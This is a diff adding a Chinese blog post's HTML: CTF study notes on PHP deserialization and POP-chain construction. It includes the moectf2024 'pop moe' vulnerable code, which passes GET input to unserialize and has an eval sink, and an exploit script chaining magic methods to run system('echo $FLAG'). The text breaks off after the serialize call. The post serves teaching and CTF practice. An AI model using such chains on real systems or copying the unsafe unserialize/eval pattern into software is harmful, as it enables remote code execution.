@@ -1,0 +1,448 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><div id="myscoll"></div><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>php反序列化 | Nanian233🍊's Blog</title><meta name="keywords" content="CTF,WEB,PHP"><meta name="author" content="Nanian233🍊"><meta name="copyright" content="Nanian233🍊"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="php反序列化笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化">
+<meta property="og:url" content="https://nanian-233.github.io/posts/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html">
+<meta property="og:site_name" content="Nanian233🍊&#39;s Blog">
+<meta property="og:description" content="php反序列化笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tuchuang.voooe.cn/images/2024/10/30/-3.png">
+<meta property="article:published_time" content="2024-12-24T19:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-24T18:59:58.165Z">
+<meta property="article:author" content="Nanian233🍊">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tuchuang.voooe.cn/images/2024/10/30/-3.png"><link rel="shortcut icon" href="/"><link rel="canonical" href="https://nanian-233.github.io/posts/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/font-awesome/6.0.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.staticfile.org/fancyapps-ui/4.0.31/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdnjs.cloudflare.com/ajax/libs/flickr-justified-gallery/2.1.2/fjGallery.min.js',
+      css: 'https://cdnjs.cloudflare.com/ajax/libs/flickr-justified-gallery/2.1.2/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'php反序列化',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-12-25 02:59:58'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 6 || hour >= 18
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="https://cdn1.tianli0.top/npm/element-ui@2.15.6/packages/theme-chalk/lib/index.css"><style id="themeColor"></style><style id="rightSide"></style><style id="transPercent"></style><style id="blurNum"></style><style id="settingStyle"></style><span id="fps"></span><style id="defineBg"></style><style id="menu_shadow"></style><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Nanian233🍊's Blog" type="application/atom+xml">
+</head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tuchuang.voooe.cn/images/2024/06/28/toux.jpg" onerror="onerror=null;src='/assets/r1.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-home"></use></svg><span class="menu_word" style="font-size:17px"> 首页</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/archives/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-guidang1"></use></svg><span class="menu_word" style="font-size:17px"> 归档</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Nanian233🍊's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-home"></use></svg><span class="menu_word" style="font-size:17px"> 首页</span></a></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/archives/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-guidang1"></use></svg><span class="menu_word" style="font-size:17px"> 归档</span></a></div></div><center id="name-container"><a id="page-name" href="javascript:scrollToTop()">PAGE_NAME</a></center><div id="nav-right"><div id="search-button"><a class="search faa-parent animated-hover" title="检索站内任何你想要的信息"><svg class="faa-tada icon" style="height:24px;width:24px;fill:currentColor;position:relative;top:6px" aria-hidden="true"><use xlink:href="#icon-valentine_-search-love-find-heart"></use></svg><span> 搜索</span></a></div><a class="meihua faa-parent animated-hover" onclick="toggleWinbox()" title="美化设置-自定义你的风格" id="meihua-button"><svg class="faa-tada icon" style="height:26px;width:26px;fill:currentColor;position:relative;top:8px" aria-hidden="true"><use xlink:href="#icon-tupian1"></use></svg></a><a class="sun_moon faa-parent animated-hover" onclick="switchNightMode()" title="浅色和深色模式转换" id="nightmode-button"><svg class="faa-tada" style="height:25px;width:25px;fill:currentColor;position:relative;top:7px" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon">       </use></svg></a><div id="toggle-menu"><a><i class="fas fa-bars fa-fw"></i></a></div></div></div></nav><div id="post-info"><h1 class="post-title">php反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><svg class="meta_icon post-meta-icon" style="width:30px;height:30px;position:relative;top:10px"><use xlink:href="#icon-rili"></use></svg><span class="post-meta-label">发表于 </span><time class="post-meta-date-created" datetime="2024-12-24T19:00:00.000Z" title="发表于 2024-12-25 03:00:00">2024-12-25</time><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:18px;height:18px;position:relative;top:5px"><use xlink:href="#icon-gengxin1"></use></svg><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-24T18:59:58.165Z" title="更新于 2024-12-25 02:59:58">2024-12-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:18px;height:18px;position:relative;top:5px"><use xlink:href="#icon-biaoqian"></use></svg><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><svg class="meta_icon post-meta-icon" style="width:25px;height:25px;position:relative;top:8px"><use xlink:href="#icon-charuword"></use></svg><span class="post-meta-label">字数总计:</span><span class="word-count">2221</span><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:20px;height:20px;position:relative;top:5px"><use xlink:href="#icon-shizhong"></use></svg><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="php反序列化"><svg class="meta_icon post-meta-icon" style="width:25px;height:25px;position:relative;top:5px"><use xlink:href="#icon-eye"></use></svg><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="介绍">介绍</h2>
+<p><strong>反序列化是将存储的数据（通常是字符串）转换回原始数据结构的过程。在 PHP 中，序列化和反序列化常用于保存和传输数据。</strong></p>
+<h2 id="关键函数">关键函数</h2>
+<p><strong>serialize</strong> 将对象格式化成有序的字符串</p>
+<p><strong>unserialize</strong> 将字符串还原成原来的对象</p>
+<p>例子:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">array</span>(<span class="string">&#x27;wo&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;nailong&#x27;</span>);</span><br><span class="line"><span class="variable">$test</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$test</span>.PHP_EOL);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$test</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">a:3:&#123;i:0;s:2:&quot;wo&quot;;i:1;s:3:&quot;shi&quot;;i:2;s:7:&quot;nailong&quot;;&#125;</span></span><br><span class="line"><span class="comment">Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; wo</span></span><br><span class="line"><span class="comment">    [1] =&gt; shi</span></span><br><span class="line"><span class="comment">    [2] =&gt; nailong</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure>
+<p>序列化是对类与对象的操作,不涉及其函数方法</p>
+<h2 id="不同成员变量可访问性">不同成员变量可访问性</h2>
+<blockquote>
+<p>php7.1以下,反序列化不会忽略成员变量可访问性,因此在反序列化时要注意格式</p>
+</blockquote>
+<ul>
+<li>public 无标记，长度不变</li>
+<li>protected 变量名前加<code>%00*%00</code>，00算1个长度,总长+3</li>
+<li>private 添加类名,且两个名前都添加标记<code>%00</code>，长度=类名+变量名+2</li>
+</ul>
+<h2 id="常用魔术方法">常用魔术方法</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()<span class="comment">//在创建对象时调用,例:new A();</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//对象被销毁时触发,例:php脚本执行完毕</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() <span class="comment">//执行serialize()时，先会调用这个函数</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//执行unserialize()时，先会调用这个函数</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//当尝试将对象调用为函数时触发</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//将数据写入不可访问的属性触发</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//在不可访问的属性上使用unset()时触发\</span></span><br></pre></td></tr></table></figure>
+<h2 id="POP链构造">POP链构造*</h2>
+<p><strong>POP 链（Property-Oriented Programming Chain）是攻击者利用反序列化对象的过程触发恶意代码执行的一种技术手段。其核心思想是构造一系列类和对象的组合，使得在 PHP 反序列化时，代码会自动调用这些类的方法（如魔术方法），最终执行攻击者定义的恶意代码。</strong></p>
+<p>例题:moectf2024 ‘pop moe’</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class000</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$payl0ad</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$what</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;payl0ad === <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;FAILED TO ATTACK&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;what;</span><br><span class="line">        <span class="variable">$a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class001</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payl0ad</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;payload = <span class="variable language_">$this</span>-&gt;payl0ad;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class002</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sec</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$b</span>(<span class="variable language_">$this</span>-&gt;sec);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dangerous</span>(<span class="params"><span class="variable">$whaattt</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$whaattt</span>-&gt;<span class="title function_ invoke__">evvval</span>(<span class="variable">$this</span>-&gt;sec);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class003</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mystr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evvval</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;mystr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>做题时逆向正向看个人喜好</p>
+<p><strong>逆向思考:</strong></p>
+<ol>
+<li>
+<p>目标是执行class003里evvval()函数的eval($str),而evvval在dangerous函数中得到调用</p>
+</li>
+<li>
+<p>接着没有直接调用dangerous的函数了,那么我们可以注意到__set()魔术方法存在一个<code>$this-&gt;$b($this-&gt;sec)</code>可以指名道姓调用dangerous()</p>
+</li>
+<li>
+<p>__set() //将数据写入不可访问的属性触发, 这里__invoke()的<code>$this-&gt;a-&gt;payload = $this-&gt;payl0ad;</code>可以触发</p>
+</li>
+<li>
+<p>__invoke() //当尝试将对象调用为函数时触发, 这里check()的<code>$a = $this-&gt;what;$a();</code>可以触发</p>
+</li>
+<li>
+<p>而check()是由__destruct()调用的,也就是说我们正常反序列化后就可以触发,此时pop链构造完成</p>
+</li>
+</ol>
+</br>
+<p><strong>正向pop链:__destruct()-&gt;check()-&gt;__invoke()-&gt;__set()-&gt;dangerous()-&gt;evvval()-&gt;eval()</strong></p>
+<p>exp的构造一般是直接取题目代码,去掉方法部分只保留需要的变量和类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class000</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payl0ad</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$what</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class001</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payl0ad</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class002</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sec</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">class003</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mystr</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//保留需要的变量和类</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$class000</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class000</span>();</span><br><span class="line"><span class="variable">$class001</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class001</span>();</span><br><span class="line"><span class="variable">$class002</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class002</span>();</span><br><span class="line"><span class="variable">$class003</span> = <span class="keyword">new</span> <span class="title function_ invoke__">class003</span>();</span><br><span class="line"><span class="comment">//实例化类</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$class000</span>-&gt;payl0ad = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$class000</span>-&gt;what = <span class="variable">$class001</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$class001</span>-&gt;payl0ad = <span class="string">&#x27;dangerous&#x27;</span>; </span><br><span class="line"><span class="variable">$class001</span>-&gt;a = <span class="variable">$class002</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$class002</span>-&gt;sec = <span class="variable">$class003</span>;</span><br><span class="line"><span class="variable">$class003</span>-&gt;mystr = <span class="string">&quot;system(&#x27;echo \$FLAG&#x27;);&quot;</span>;</span><br><span class="line"><span class="comment">//赋值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$class000</span>);</span><br><span class="line"><span class="comment">#echo 